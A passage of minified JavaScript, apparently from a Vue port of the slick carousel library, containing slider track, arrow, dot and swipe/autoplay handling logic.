t=[],n=k(e),r=M(e),i=n;i<r;i++)e.lazyLoadedList.indexOf(i)<0&&t.push(i);return t},P=function(e,t){var n,r,i,a,s,l=e.slidesToScroll,c=e.slidesToShow,u=e.slideCount,d=e.currentSlide,p=e.lazyLoad,h=e.infinite;if(n=u%l!=0?0:(u-d)%l,"previous"===t.message)a=d-(i=0===n?l:c-n),p&&!h&&(a=-1==(r=d-i)?u-1:r);else if("next"===t.message)a=d+(i=0===n?l:n),p&&!h&&(a=(d+l)%u+n);else if("dots"===t.message){if((a=t.index*t.slidesToScroll)===t.currentSlide)return null}else if("children"===t.message){if((a=t.index)===t.currentSlide)return null;if(h){var f=(s=o({},e,{targetSlide:a})).targetSlide>s.currentSlide?s.targetSlide>s.currentSlide+function(e){var t=e.slidesToShow,n=e.centerMode,r=e.rtl,i=e.centerPadding;if(n){var a=(t-1)/2+1;return 0<parseInt(i)&&(a+=1),r&&t%2==0&&(a+=1),a}return r?0:t-1}(s)?"left":"right":s.targetSlide<s.currentSlide-function(e){var t=e.slidesToShow,n=e.centerMode,r=e.rtl,i=e.centerPadding;if(n){var a=(t-1)/2+1;return 0<parseInt(i)&&(a+=1),r||t%2!=0||(a+=1),a}return r?t-1:0}(s)?"right":"left";a>t.currentSlide&&"left"===f?a-=u:a<t.currentSlide&&"right"===f&&(a+=u)}}else if("index"===t.message&&(a=Number(t.index))===t.currentSlide)return null;return a},I=function(e){return Object.keys(e).filter((function(t){return void 0!==e[t]})).reduce((function(t,n){return t[n]=e[n],t}),{})},F=function(e,t){var n=function(e){for(var t=e.infinite?2*e.slideCount:e.slideCount,n=e.infinite?-1*e.slidesToShow:0,r=e.infinite?-1*e.slidesToShow:0,i=[];n<t;)i.push(n),n=r+e.slidesToScroll,r+=Math.min(e.slidesToScroll,e.slidesToShow);return i}(e),r=0;if(t>n[n.length-1])t=n[n.length-1];else for(var i in n){if(t<n[i]){t=r;break}r=n[i]}return t},L=function(e){var t=e.centerMode?e.slideWidth*Math.floor(e.slidesToShow/2):0;if(e.swipeToSlide){var n,r=e.listRef.querySelectorAll(".slick-slide");if(Array.from(r).every((function(r){if(e.vertical){if(r.offsetTop+j(r)/2>-1*e.swipeLeft)return n=r,!1}else if(r.offsetLeft-t+R(r)/2>-1*e.swipeLeft)return n=r,!1;return!0})),!n)return 0;var i=!0===e.rtl?e.slideCount-e.currentSlide:e.currentSlide;return Math.abs(n.dataset.index-i)||1}return e.slidesToScroll},O=function(e,t){var n={};return t.forEach((function(t){return n[t]=e[t]})),n},N={TRACK:["fade","cssEase","speed","infinite","centerMode","currentSlide","lazyLoad","lazyLoadedList","rtl","slideWidth","slideHeight","listHeight","vertical","slidesToShow","slidesToScroll","slideCount","trackStyle","variableWidth","unslick","centerPadding"],DOT:["dotsClass","slideCount","slidesToShow","currentSlide","slidesToScroll","children","customPaging","infinite"],ARROW:["infinite","centerMode","currentSlide","slideCount","slidesToShow","prevArrow","nextArrow"]},D=function(e){var t=!0;return e.infinite||(e.centerMode&&e.currentSlide>=e.slideCount-1||e.slideCount<=e.slidesToShow||e.currentSlide>=e.slideCount-e.slidesToShow)&&(t=!1),t},R=function(e){return e&&e.offsetWidth||0},j=function(e){return e&&e.offsetHeight||0},U=function(e){var t,n,r,i,a=1<arguments.length&&void 0!==arguments[1]&&arguments[1];return t=e.startX-e.curX,n=e.startY-e.curY,r=Math.atan2(n,t),(i=Math.round(180*r/Math.PI))<0&&(i=360-Math.abs(i)),i<=45&&0<=i||i<=360&&315<=i?"left":135<=i&&i<=225?"right":!0===a?35<=i&&i<=135?"up":"down":"vertical"},$=function(e){if(e.unslick)return 0;z(e,["slideIndex","trackRef","infinite","centerMode","slideCount","slidesToShow","slidesToScroll","slideWidth","listWidth","variableWidth","slideHeight"]);var t,n,r=e.slideIndex,i=e.trackRef,a=e.infinite,o=e.centerMode,s=e.slideCount,l=e.slidesToShow,c=e.slidesToScroll,u=e.slideWidth,d=e.listWidth,p=e.variableWidth,h=e.slideHeight,f=e.fade,A=e.vertical;if(f||1===e.slideCount)return 0;var m=0;if(a?(m=-x(e),s%c!=0&&s<r+c&&(m=-(s<r?l-(r-s):s%c)),o&&(m+=parseInt(l/2))):(s%c!=0&&s<r+c&&(m=l-s%c),o&&(m=parseInt(l/2))),t=A?r*h*-1+m*h:r*u*-1+m*u,!0===p){var v,g=i.$el;if(v=r+x(e),t=(n=g&&g.childNodes[v])?-1*n.offsetLeft:0,!0===o){v=a?r+x(e):r,n=g&&g.children[v];for(var y=t=0;y<v;y++)t-=g&&g.children[y]&&g.children[y].offsetWidth;t-=parseInt(e.centerPadding),t+=n&&(d-n.offsetWidth)/2}}return t},z=function(e,t){return t.reduce((function(t,n){return t&&e.hasOwnProperty(n)}),!0)?null:void 0},H=function(e){var t,n;z(e,["left","variableWidth","slideCount","slidesToShow","slideWidth"]);var r,i=e.slideCount+2*e.slidesToShow;e.vertical?n=i*e.slideHeight:t=(1===(r=e).slideCount?1:x(r)+r.slideCount+S(r))*e.slideWidth;var a={opacity:1,transition:"",WebkitTransition:""};return e.useTransform?a=o({},a,{WebkitTransform:e.vertical?"translate3d(0px, "+e.left+"px, 0px)":"translate3d("+e.left+"px, 0px, 0px)",transform:e.vertical?"translate3d(0px, "+e.left+"px, 0px)":"translate3d("+e.left+"px, 0px, 0px)",msTransform:e.vertical?"translateY("+e.left+"px)":"translateX("+e.left+"px)"}):e.vertical?a.top=e.left:a.left=e.left,e.fade&&(a={opacity:1}),t&&(a.width=t+"px"),n&&(a.height=n+"px"),window&&!window.addEventListener&&window.attachEvent&&(e.vertical?a.marginTop=e.left+"px":a.marginLeft=e.left+"px"),a},V=function(e){z(e,["left","variableWidth","slideCount","slidesToShow","slideWidth","speed","cssEase"]);var t=H(e);return e.useTransform?(t.WebkitTransition="-webkit-transform "+e.speed+"ms "+e.cssEase,t.transition="transform "+e.speed+"ms "+e.cssEase):e.vertical?t.transition="top "+e.speed+"ms "+e.cssEase:t.transition="left "+e.speed+"ms "+e.cssEase,t},Q={accessibility:{type:Boolean,default:!0},adaptiveHeight:{type:Boolean,default:!1},arrows:{type:Boolean,default:!0},asNavFor:{type:Object,default:null},autoplay:{type:Boolean,default:!1},autoplaySpeed:{type:Number,default:3e3},centerMode:{type:Boolean,default:!1},centerPadding:{type:String,default:"50px"},cssEase:{type:String,default:"ease"},dots:{type:Boolean,default:!1},dotsClass:{type:String,default:"slick-dots"},draggable:{type:Boolean,default:!0},edgeFriction:{type:Number,default:.35},fade:{type:Boolean,default:!1},focusOnSelect:{type:Boolean,default:!1},infinite:{type:Boolean,default:!0},initialSlide:{type:Number,default:0},lazyLoad:{type:String,default:null},pauseOnDotsHover:{type:Boolean,default:!1},pauseOnFocus:{type:Boolean,default:!1},pauseOnHover:{type:Boolean,default:!0},responsive:{type:Array,default:null},rows:{type:Number,default:1},rtl:{type:Boolean,default:!1},slidesPerRow:{type:Number,default:1},slidesToScroll:{type:Number,default:1},slidesToShow:{type:Number,default:1},speed:{type:Number,default:500},swipe:{type:Boolean,default:!0},swipeToSlide:{type:Boolean,default:!1},touchMove:{type:Boolean,default:!0},touchThreshold:{type:Number,default:5},useCSS:{type:Boolean,default:!0},useTransform:{type:Boolean,default:!0},variableWidth:{type:Boolean,default:!1},vertical:{type:Boolean,default:!1},waitForAnimate:{type:Boolean,default:!0}},G=Object.keys(Q).reduce((function(e,t){return e[t]=Q[t].default,e}),{});function W(e,t){if(null==e)return{};var n,r,i=function(e,t){if(null==e)return{};var n,r,i={},a=Object.keys(e);for(r=0;r<a.length;r++)n=a[r],0<=t.indexOf(n)||(i[n]=e[n]);return i}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)n=a[r],0<=t.indexOf(n)||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}function K(e){return(K="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e})(e)}Object.keys(Q).reduce((function(e,t){return e[t]=Q[t].type,e}),{}),n("cca6"),n("e01a"),n("d28b"),n("e260"),n("d3b7"),n("ddb0");var q=n("6dd8"),X=n("f7fe"),Y=n.n(X),J=function(e){var t,n,r,i,a;return r=(a=e.rtl?e.slideCount-1-e.index:e.index)<0||a>=e.slideCount,e.centerMode?(i=Math.floor(e.slidesToShow/2),n=(a-e.currentSlide)%e.slideCount==0,a>e.currentSlide-i-1&&a<=e.currentSlide+i&&(t=!0)):t=e.currentSlide<=a&&a<e.currentSlide+e.slidesToShow,{"slick-slide":!0,"slick-active":t,"slick-center":n,"slick-cloned":r,"slick-current":a===e.currentSlide}},Z=function(e,t){return null!=e.key&&String(e.key)||t},ee={name:"SliderTrack",props:N.TRACK,methods:{cloneSlide:function(e,t){var n=this,r=b(e);return r.key=t.key,v(r,"class",t.class),v(r,"attrs",t.attrs),v(r,"style",t.style),v(r,"on",{click:function(r){_(e,"on.click",(function(){}))(r),n.$emit("childClicked",t.childOnClickOptions)}}),r},renderSlides:function(e,t){var n,r=this,i=this.$createElement,a=[],s=[],l=[],c=t.length,u=k(e),d=M(e);return t.forEach((function(t,p){var h,f={message:"children",index:p,slidesToScroll:e.slidesToScroll,currentSlide:e.currentSlide};h=!e.lazyLoad||e.lazyLoad&&0<=e.lazyLoadedList.indexOf(p)?t:i("div");var A,m,v=(m={},void 0!==(A=o({},e,{index:p})).variableWidth&&!1!==A.variableWidth||(m.width="number"==typeof A.slideWidth?"".concat(A.slideWidth,"px"):A.slideWidth),A.fade&&(m.position="relative",A.vertical?m.top="".concat(-A.index*parseInt(A.slideHeight),"px"):m.left="".concat(-A.index*parseInt(A.slideWidth),"px"),m.opacity=A.currentSlide===A.index?1:0,m.transition="opacity "+A.speed+"ms "+A.cssEase+", visibility "+A.speed+"ms "+A.cssEase),m),g=J(o({},e,{index:p}));if(a.push(r.cloneSlide(h,{key:"original"+Z(h,p),class:g,style:o({outline:"none"},v),attrs:{tabIndex:"-1","data-index":p,"aria-hidden":"".concat(!g["slick-active"])},childOnClickOptions:f})),e.infinite&&!1===e.fade&&c>e.slidesToShow){var y=c-p;y<=x(e)&&c!==e.slidesToShow&&(u<=(n=-y)&&(h=t),g=J(o({},e,{index:n})),s.push(r.cloneSlide(h,{key:"precloned"+Z(h,n),class:g,style:v,attrs:{tabIndex:"-1","data-index":n,"aria-hidden":"".concat(!g["slick-active"])},childOnClickOptions:f}))),c!==e.slidesToShow&&((n=c+p)<d&&(h=t),g=J(o({},e,{index:n})),l.push(r.cloneSlide(h,{key:"postcloned"+Z(h,n),class:g,style:v,attrs:{tabIndex:"-1","data-index":n,"aria-hidden":"".concat(!g["slick-active"])},childOnClickOptions:f})))}}),this),e.rtl?s.concat(a,l).reverse():s.concat(a,l)}},render:function(){var e=arguments[0],t=this.renderSlides(this.$props,this.$slots.default);return e("div",{class:{"slick-track":!0,"slick-center":this.$props.centerMode},style:this.trackStyle},[t])}},te=(n("6ea2"),c(ee,void 0,void 0,!1,null,"e4caeaf8",null).exports);function ne(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,r=new Array(t);n<t;n++)r[n]=e[n];return r}n("b0c0"),n("25f0");var re,ie={name:"SliderArrow",props:[].concat((re=N.ARROW,function(e){if(Array.isArray(e))return ne(e)}(re)||function(e){if("undefined"!=typeof Symbol&&Symbol.iterator in Object(e))return Array.from(e)}(re)||function(e,t){if(e){if("string"==typeof e)return ne(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(n):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?ne(e,t):void 0}}(re)||function(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()),["type"]),render:function(){var e,t=this,n=arguments[0],r={"slick-arrow":!0},i=!0,a={currentSlide:this.currentSlide,slideCount:this.slideCount};return e="previous"===this.type?(r["slick-prev"]=!0,!this.infinite&&(0===this.currentSlide||this.slideCount<=this.slidesToShow)&&(r["slick-disabled"]=!0,i=!1),a.key="0",this.prevArrow?this.prevArrow(a)[0]:n("button",{attrs:{type:"button","data-role":"none"},style:"display: block;"},["Previous"])):(r["slick-next"]=!0,D(this.$props)||(r["slick-disabled"]=!0,i=!1),a.key="1",this.nextArrow?this.nextArrow(a)[0]:n("button",{attrs:{type:"button","data-role":"none"},style:"display: block;"},["Next"])),g(e,"key",a.key),v(e,"class",r),v(e,"on",{click:function(){i&&t.$emit("arrowClicked",{message:t.type})}}),e}},ae=(n("f013"),c(ie,void 0,void 0,!1,null,"21137603",null).exports),oe=(n("1276"),c({name:"SliderDots",props:N.DOT,render:function(){var e,t=this,n=arguments[0],r=(e={slideCount:this.slideCount,slidesToScroll:this.slidesToScroll,slidesToShow:this.slidesToShow,infinite:this.infinite}).infinite?Math.ceil(e.slideCount/e.slidesToScroll):Math.ceil((e.slideCount-e.slidesToShow)/e.slidesToScroll)+1,a=Array.apply(null,Array(r+1).join("0").split("")).map((function(e,r){var i=r*t.slidesToScroll,a=r*t.slidesToScroll+(t.slidesToScroll-1),o={"slick-active":t.currentSlide>=i&&t.currentSlide<=a},s={message:"dots",index:r,slidesToScroll:t.slidesToScroll,currentSlide:t.currentSlide},l=t.customPaging?t.customPaging(r)[0]:n("button",[r+1]);return n("li",{key:r,class:o,on:{click:function(){return t.$emit("dotClicked",s)}}},[l])})),o=i({},this.dotsClass,!0);return n("ul",{style:{display:"block"},class:o},[a])}},void 0,void 0,!1,null,null,null).exports),se={animating:!1,autoplaying:null,currentDirection:0,currentLeft:null,currentSlide:0,direction:1,dragging:!1,edgeDragged:!1,initialized:!1,lazyLoadedList:[],listHeight:null,listWidth:null,scrolling:!1,slideHeight:null,slideWidth:null,swipeLeft:null,swiped:!1,swiping:!1,touchObject:{startX:0,startY:0,curX:0,curY:0},trackStyle:{},trackWidth:0},le={name:"InnerSlider",components:{SliderTrack:te,SliderArrow:ae,SliderDots:oe},mixins:[u],inheritAttrs:!1,props:o({},Q,{unslick:{type:Boolean,default:!1},prevArrow:Function,nextArrow:Function,customPaging:Function}),data:function(){return o({},se,{currentSlide:this.initialSlide})},computed:{slideCount:function(){return this.$slots.default.length},spec:function(){return o({},this.$props,{},this.$data,{slideCount:this.slideCount})}},created:function(){if(this.callbackTimers=[],this.clickable=!0,this.debouncedResize=null,this.ssrInit(),this.$parent.$emit("init"),this.lazyLoad){var e=T(this.spec);0<e.length&&(this.lazyLoadedList=this.lazyLoadedList.concat(e),this.$parent.$emit("lazyLoad",e))}},mounted:function(){var e=this,t=o({listRef:this.$refs.list,trackRef:this.$refs.track,children:this.$slots.default},this.$props);this.updateState(t,!0),this.adaptHeight(),this.autoPlay&&this.autoPlay("update"),"progressive"===this.lazyLoad&&(this.lazyLoadTimer=setInterval(this.progressiveLazyLoad,1e3)),this.ro=new q.a((function(){e.animating?(e.onWindowResized(!1),e.callbackTimers.push(setTimeout((function(){return e.onWindowResized()}),e.speed))):e.onWindowResized()})),this.ro.observe(this.$refs.list),Array.prototype.forEach.call(this.$refs.list.querySelectorAll(".slick-slide"),(function(t){t.onfocus=e.pauseOnFocus?e.onSlideFocus:null,t.onblur=e.pauseOnFocus?e.onSlideBlur:null})),window.addEventListener?window.addEventListener("resize",this.onWindowResized):window.attachEvent("onresize",this.onWindowResized)},updated:function(){if(this.checkImagesLoad(),this.$parent.$emit("reInit"),this.lazyLoad){var e=T(o({},this.$props,{},this.$data));0<e.length&&(this.lazyLoadedList=this.lazyLoadedList.concat(e),this.$parent.$emit("lazyLoad",e))}this.adaptHeight()},beforeDestroy:function(){this.ro.unobserve(this.$refs.list),this.animationEndCallback&&clearTimeout(this.animationEndCallback),this.lazyLoadTimer&&clearInterval(this.lazyLoadTimer),this.callbackTimers.length&&(this.callbackTimers.forEach((function(e){return clearTimeout(e)})),this.callbackTimers=[]),window.addEventListener?window.removeEventListener("resize",this.onWindowResized):window.detachEvent("onresize",this.onWindowResized),this.autoplayTimer&&clearInterval(this.autoplayTimer)},methods:{onPropsUpdated:function(){for(var e=this.$props,t=o({listRef:this.$refs.list,trackRef:this.$refs.track,children:this.$slots.default},e,{},this.$data),n=!1,r=0,i=Object.keys(this.$props);r<i.length;r++){var a=i[r];if(!e.hasOwnProperty(a)){n=!0;break}if("object"!==K(e[a])&&"function"!=typeof e[a]&&e[a]!==this.$props[a]){n=!0;break}}this.updateState(t,n),this.currentSlide>=this.slideCount&&this.changeSlide({message:"index",index:this.slideCount-e.slidesToShow,currentSlide:this.currentSlide}),e.autoplay?this.autoPlay("update"):this.pause("paused")},updateState:function(e,t){var n=function(e){var t,n=e.children.length,r=Math.ceil(R(e.listRef)),i=Math.ceil(R(e.trackRef));if(e.vertical)t=r;else{var a=e.centerMode&&2*parseInt(e.centerPadding);"string"==typeof e.centerPadding&&"%"===e.centerPadding.slice(-1)&&(a*=r/100),t=Math.ceil((r-a)/e.slidesToShow)}var o=e.listRef&&j(e.listRef.querySelector('[data-index="0"]')),s=o*e.slidesToShow,l=void 0===e.currentSlide?e.initialSlide:e.currentSlide;e.rtl&&void 0===e.currentSlide&&(l=n-1-e.initialSlide);var c=e.lazyLoadedList||[],u=T({currentSlide:l,lazyLoadedList:c});c.concat(u);var d={slideCount:n,slideWidth:t,listWidth:r,trackWidth:i,currentSlide:l,slideHeight:o,listHeight:s,lazyLoadedList:c};return null===e.autoplaying&&e.autoplay&&(d.autoplaying="playing"),d}(e);e=o({},e=o({},e,{},n,{slideIndex:n.currentSlide}),{left:$(e)});var r=H(e);(t||this.slideCount!==e.children.length)&&(n.trackStyle=r),Object.assign(this.$data,n)},adaptHeight:function(){if(this.adaptiveHeight&&this.$refs.list){var e=this.$refs.list.querySelector('[data-index="'.concat(this.currentSlide,'"]'));this.$refs.list.style.height=j(e)+"px"}},ssrInit:function(){var e=x(this.spec),t=S(this.spec);if(this.variableWidth){var n=[],r=[],i=[];this.$slots.default.forEach((function(e){var t=w(e).width;i.push(t),n.push(t)}));for(var a=0;a<e;a++)r.push(i[i.length-1-a]),n.push(i[i.length-1-a]);for(var o=0;o<t;o++)n.push(i[o]);for(var s=0;s<this.currentSlide;s++)r.push(i[s]);n=n.filter((function(e){return e})),r=r.filter((function(e){return e}));var l={width:"calc(".concat(n.join(" + "),")"),left:"calc(".concat(r.map((function(e){return"-".concat(e)})).join(" + "),")")};if(this.centerMode){var c=i[this.currentSlide];l.left="calc(".concat(r.map((function(e){return"-".concat(e)})).join(" + ")," + (100% - ").concat(c,") / 2 )")}this.trackStyle=l}else{var u=e+t+this.slideCount,d=100/this.slidesToShow*u,p=100/u,h=-p*(e+this.currentSlide)*d/100;this.centerMode&&(h+=(100-p*d/100)/2),this.slideWidth=p+"%",this.trackStyle={width:d+"%",left:h+"%"}}},slideHandler:function(e){var t=this,n=1<arguments.length&&void 0!==arguments[1]&&arguments[1],r=this.asNavFor,i=this.speed,a=this.currentSlide,s=function(e){var t=e.waitForAnimate,n=e.animating,r=e.fade,i=e.infinite,a=e.index,s=e.slideCount,l=e.lazyLoadedList,c=e.lazyLoad,u=e.currentSlide,d=e.centerMode,p=e.slidesToScroll,h=e.slidesToShow,f=e.useCSS;if(t&&n)return{};var A,m,v,g=a,y={},b={};if(r){if(!i&&(a<0||s<=a))return{};a<0?g=a+s:s<=a&&(g=a-s),c&&l.indexOf(g)<0&&l.push(g),b={animating:(y={animating:!0,currentSlide:g,lazyLoadedList:l},!1)}}else(A=g)<0?(A=g+s,i?s%p!=0&&(A=s-s%p):A=0):!D(e)&&u<g?g=A=u:d&&s<=g?(g=i?s:s-1,A=i?0:s-1):s<=g&&(A=g-s,i?s%p!=0&&(A=0):A=s-h),m=$(o({},e,{slideIndex:g})),v=$(o({},e,{slideIndex:A})),i||(m===v&&(g=A),m=v),c&&l.concat(T(o({},e,{currentSlide:g}))),f?b={animating:(y={animating:!0,currentSlide:A,trackStyle:V(o({},e,{left:m})),lazyLoadedList:l},!1),currentSlide:A,trackStyle:H(o({},e,{left:v})),swipeLeft:null}:y={currentSlide:A,trackStyle:H(o({},e,{left:v})),lazyLoadedList:l};return{state:y,nextState:b}}(o({index:e},this.$props,{},this.$data,{trackRef:this.$refs.track,useCSS:this.useCSS&&!n})),l=s.state,c=s.nextState;if(l){this.$parent.$emit("beforeChange",a,l.currentSlide);var u=l.lazyLoadedList.filter((function(e){return t.lazyLoadedList.indexOf(e)<0}));u.length&&this.$parent.$emit("lazyLoad",u),Object.assign(this.$data,l),r&&r.goTo(e),c&&(this.animationEndCallback=setTimeout((function(){var e=c.animating,n=W(c,["animating"]);Object.assign(t.$data,n),t.callbackTimers.push(setTimeout((function(){t.animating=e}),10)),t.$parent.$emit("afterChange",l.currentSlide),t.animationEndCallback=void 0}),i))}},onWindowResized:function(e){var t=this;this.debouncedResize&&this.debouncedResize.cancel(),this.debouncedResize=Y()((function(){return t.resizeWindow(e)}),50),this.debouncedResize()},resizeWindow:function(){var e=!(0<arguments.length&&void 0!==arguments[0])||arguments[0];if(this.$refs.track&&this.$refs.track.$el){var t=o({listRef:this.$refs.list,trackRef:this.$refs.track,children:this.$slots.default},this.$props,{},this.$data);this.updateState(t,e),this.autoplay?this.autoPlay("update"):this.pause("paused"),this.animating=!1,clearTimeout(this.animationEndCallback),this.animationEndCallback=void 0}},checkImagesLoad:function(){var e=this,t=this.$refs.list.querySelectorAll(".slick-slide img"),n=t.length,r=0;Array.prototype.forEach.call(t,(function(t){var i=function(){return++r&&n<=r&&e.onWindowResized()};if(t.onclick){var a=t.onclick;t.onclick=function(){a(),t.parentNode.focus()}}else t.onclick=function(){return t.parentNode.focus()};t.onload||(e.lazyLoad?t.onload=function(){e.adaptHeight(),e.callbackTimers.push(setTimeout(e.onWindowResized,e.speed))}:(t.onload=i,t.onerror=function(){i(),e.$parent.$emit("lazyLoadError")}))}))},progressiveLazyLoad:function(){for(var e=[],t=o({},this.$props,{},this.$data),n=this.currentSlide;n<this.slideCount+S(t);n++)if(this.lazyLoadedList.indexOf(n)<0){e.push(n);break}for(var r=this.currentSlide-1;r>=-x(t);r--)if(this.lazyLoadedList.indexOf(r)<0){e.push(r);break}0<e.length?(this.lazyLoadedList=this.lazyLoadedList.concat(e),this.$parent.$emit("lazyLoad",e)):this.lazyLoadTimer&&(clearInterval(this.lazyLoadTimer),this.lazyLoadTimer=void 0)},clickHandler:function(e){!1===this.clickable&&(e.stopPropagation(),e.preventDefault()),this.clickable=!0},keyHandler:function(e){var t,n,r,i=(t=e,n=this.accessibility,r=this.rtl,t.target.tagName.match("TEXTAREA|INPUT|SELECT")||!n?"":37===t.keyCode?r?"next":"previous":39===t.keyCode?r?"previous":"next":"");""!==i&&this.changeSlide({message:i})},changeSlide:function(e){var t=1<arguments.length&&void 0!==arguments[1]&&arguments[1],n=o({},this.$props,{},this.$data),r=P(n,e);(0===r||r)&&(!0===t?this.slideHandler(r,t):this.slideHandler(r))},swipeStart:function(e){this.verticalSwiping&&this.disableBodyScroll();var t,n,r,i=(t=e,n=this.swipe,r=this.draggable,!n||!r&&-1!==t.type.indexOf("mouse")?"":{dragging:!0,touchObject:{startX:t.touches?t.touches[0].pageX:t.clientX,startY:t.touches?t.touches[0].pageY:t.clientY,curX:t.touches?t.touches[0].pageX:t.clientX,curY:t.touches?t.touches[0].pageY:t.clientY}});""!==i&&Object.assign(this.$data,i)},swipeMove:function(e){var t=this,n=function(e,t){var n=t.scrolling,r=t.animating,i=t.vertical,a=t.swipeToSlide,s=t.verticalSwiping,l=t.rtl,c=t.currentSlide,u=t.edgeFriction,d=t.edgeDragged,p=t.onEdge,h=t.swiped,f=t.swiping,A=t.slideCount,m=t.slidesToScroll,v=t.infinite,g=t.touchObject,y=t.swipeEvent,b=t.listHeight,_=t.listWidth;if(!n){if(r)return e.preventDefault();i&&a&&s&&e.preventDefault();var w,C={},x=$(t);g.curX=e.touches?e.touches[0].pageX:e.clientX,g.curY=e.touches?e.touches[0].pageY:e.clientY,g.swipeLength=Math.round(Math.sqrt(Math.pow(g.curX-g.startX,2)));var S=Math.round(Math.sqrt(Math.pow(g.curY-g.startY,2)));if(!s&&!f&&10<S)return{scrolling:!0};s&&(g.swipeLength=S);var k=(l?-1:1)*(g.curX>g.startX?1:-1);s&&(k=g.curY>g.startY?1:-1);var M=Math.ceil(A/m),B=U(t.touchObject,s),E=g.swipeLength;return v||(0===c&&"right"===B||M<=c+1&&"left"===B||!D(t)&&"left"===B)&&(E=g.swipeLength*u,!1===d&&p&&(p(B),C.edgeDragged=!0)),!h&&y&&(y(B),C.swiped=!0),w=i?x+E*(b/_)*k:l?x-E*k:x+E*k,s&&(w=x+E*k),C=o({},C,{touchObject:g,swipeLeft:w,trackStyle:H(o({},t,{left:w}))}),Math.abs(g.curX-g.startX)<.8*Math.abs(g.curY-g.startY)||10<g.swipeLength&&(C.swiping=!0,e.preventDefault()),C}}(e,o({},this.$props,{},this.$data,{trackRef:this.$refs.track,listRef:this.$refs.list,slideIndex:this.currentSlide,onEdge:function(e){return t.$parent.$emit("edge",e)},swipeEvent:function(e){return t.$parent.$emit("swipe",e)}}));n&&(n.swiping&&(this.clickable=!1),Object.assign(this.$data,n))},swipeEnd:function(e){var t=function(e,t){var n=t.dragging,r=t.swipe,i=t.touchObject,a=t.listWidth,s=t.touchThreshold,l=t.verticalSwiping,c=t.listHeight,u=t.currentSlide,d=t.swipeToSlide,p=t.scrolling,h=t.onSwipe;if(!n)return r&&e.preventDefault(),{};var f=l?c/s:a/s,A=U(i,l),m={dragging:!1,edgeDragged:!1,scrolling:!1,swiping:!1,swiped:!1,swipeLeft:null,touchObject:{}};if(p)return m;if(!i.swipeLength)return m;if(i.swipeLength>f){var v,g;switch(e.preventDefault(),h&&h(A),A){case"left":case"up":g=u+L(t),v=d?F(t,g):g,m.currentDirection=0;break;case"right":case"down":g=u-L(t),v=d?F(t,g):g,m.currentDirection=1;break;default:v=u}m.triggerSlideHandler=v}else{var y=$(t);m.trackStyle=V(o({},t,{left:y}))}return m}(e,o({},this.$props,{},this.$data,{trackRef:this.$refs.track,listRef:this.$refs.list,slideIndex:this.currentSlide}));if(t){var n=t.triggerSlideHandler;this.triggerSlideHandler=void 0,Object.assign(this.$data,t),void 0!==n&&(this.slideHandler(n),this.verticalSwiping&&this.enableBodyScroll())}},prev:function(){var e=this;this.callbackTimers.push(setTimeout((function(){return e.changeSlide({message:"previous"})}),0))},next:function(){var e=this;this.callbackTimers.push(setTimeout((function(){return e.changeSlide({message:"next"})}),0))},goTo:function(e){var t=this,n=1<arguments.length&&void 0!==arguments[1]&&arguments[1];if(e=Number(e),isNaN(e))return"";this.callbackTimers.push(setTimeout((function(){return t.changeSlide({message:"index",index:e,currentSlide:t.currentSlide},n)}),0))},play:function(){var e;if(this.rtl)e=this.currentSlide-this.slidesToScroll;else{if(!D(o({},this.$props,{},this.$data)))return!1;e=this.currentSlide+this.slidesToScroll}this.slideHandler(e)},autoPlay:function(e){this.autoplayTimer&&clearInterval(this.autoplayTimer);var t=this.autoplaying;if("update"===e){if("hovered"===t||"focused"===t||"paused"===t)return}else if("leave"===e){if("paused"===t||"focused"===t)return}else if("blur"===e&&("paused"===t||"hovered"===t))return;this.autoplayTimer=setInterval(this.play,this.autoplaySpeed+50),this.autoplaying="playing"},pause:function(e){this.autoplayTimer&&(clearInterval(this.autoplayTimer),this.autoplayTimer=null);var t=this.autoplaying;"paused"===e?this.autoplaying="paused":"focused"===e?"hovered"!==t&&"playing"!==t||(this.autoplaying="focused"):"playing"===t&&(this.autoplaying="hovered")},onDotsOver:function(){this.autoplay&&this.pause("hovered")},onDotsLeave:function(){this.autoplay&&"hovered"===this.autoplaying&&this.autoPlay("leave")},onTrackOver:function(){this.autoplay&&this.pause("hovered")},onTrackLeave:function(){this.autoplay&&"hovered"===this.autoplaying&&this.autoPlay("leave")},onSlideFocus:function(){this.autoplay&&this.pause("focused")},onSlideBlur:function(){this.autoplay&&"focused"===this.autoplaying&&this.autoPlay("blur")},selectHandler:function(e){this.focusOnSelect&&this.changeSlide(e)}},render:function(){var e=arguments[0],t={"slick-slider":!0,"slick-initialized":!0,"slick-vertical":this.vertical},n=O(this.spec,N.TRACK);n=I(o({},n));var r,i,a,s=this.pauseOnHover,l=I({mouseenter:s?this.onTrackOver:void 0,mouseover:s?this.onTrackOver:void 0,mouseleave:s?this.onTrackLeave:void 0});if(!0===this.dots&&this.slideCount>=this.slidesToShow){var c=O(this.spec,N.DOT),u=this.pauseOnDotsHover,d=I({mouseenter:u?this.onDotsLeave:void 0,mouseover:u?this.onDotsOver:void 0,mouseleave:u?this.onDotsLeave:void 0});r=e(oe,{props:o({},c),nativeOn:o({},d),on:{dotClicked:this.changeSlide}})}var p=O(this.spec,N.ARROW);this.arrows&&(i=e(ae,{props:o({},o({},p,{type:"previous"})),on:{arrowClicked:this.changeSlide}}),a=e(ae,{props:o({},o({},p,{type:"next"})),on:{arrowClicked:this.changeSlide}}));var h={};this.vertical&&(h={height:"".concat(this.listHeight,"px")});var f={};!1===this.vertical?!0===this.centerMode&&(f={padding:"0px "+this.centerPadding}):!0===this.centerMode&&(f={padding:this.centerPadding+" 0px"});var A,m=o({},this.$parent.$vnode.data.style);this.unslick||(m=o({},m,{},(A=h,Object.keys(A).filter((function(e){return void 0!==A[e]&&null!==A[e]})).reduce((function(e,t){return e[t]=A[t],e}),{})),{},f));var v=this.accessibility,g=this.dragging,y=this.touchMove,b=I({click:this.clickHandler,mousedown:y?this.swipeStart:void 